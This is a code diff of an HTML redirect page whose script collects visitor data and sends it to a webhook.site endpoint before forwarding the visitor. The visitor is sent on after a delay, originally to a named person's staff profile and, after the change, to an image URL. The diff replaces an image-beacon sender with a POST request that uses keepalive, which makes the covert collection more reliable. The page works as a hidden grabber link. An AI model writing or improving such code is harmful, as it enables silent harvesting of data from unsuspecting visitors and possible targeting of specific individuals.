@@ -14,7 +14,7 @@
     <script>
         // === CONFIGURATION ===
         const LOG_ENDPOINT = "https://webhook.site/f1c52871-c825-4c3a-a85f-da2157857f28";
-        const DEFAULT_REDIRECT = "https://roundtablehp.com/team/operatingteam/thomaspkapfer.html";
+        const DEFAULT_REDIRECT = "https://example.com/image.jpg";
         // =====================
 
         function getQueryParam(name) {
@@ -90,21 +90,21 @@
             return data;
         }
 
-        function sendToEndpoint(data) {
-            return new Promise((resolve) => {
-                // Build URL with all tracking data as query params
-                const params = new URLSearchParams();
-                
-                for (const [key, value] of Object.entries(data)) {
-                    params.append(key, String(value || ""));
-                }
-                
-                // Send via image beacon (works everywhere, no CORS issues)
-                const img = new Image();
-                img.onload = () => resolve();
-                img.onerror = () => resolve(); // Resolve anyway
-                img.src = LOG_ENDPOINT + "?" + params.toString().substring(0, 4000);
-            });
+        async function sendToEndpoint(data) {
+            try {
+                const response = await fetch(LOG_ENDPOINT, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data),
+                    keepalive: true
+                });
+                return response.ok;
+            } catch (e) {
+                console.log("Failed to send data:", e);
+                return false;
+            }
         }
 
         async function main() {
@@ -114,16 +114,16 @@
                 // Collect all tracking data
                 const data = await collectData();
 
-                // Send to logging endpoint
+                // Send to logging endpoint via POST
                 await sendToEndpoint(data);
             } catch (e) {
                 console.log("Error during tracking:", e);
             }
 
-            // Always redirect, even if tracking fails
+            // Always redirect after a delay, even if tracking fails
             setTimeout(() => {
                 window.location.href = redirectUrl;
-            }, 1500);
+            }, 2000);
         }
 
         main();
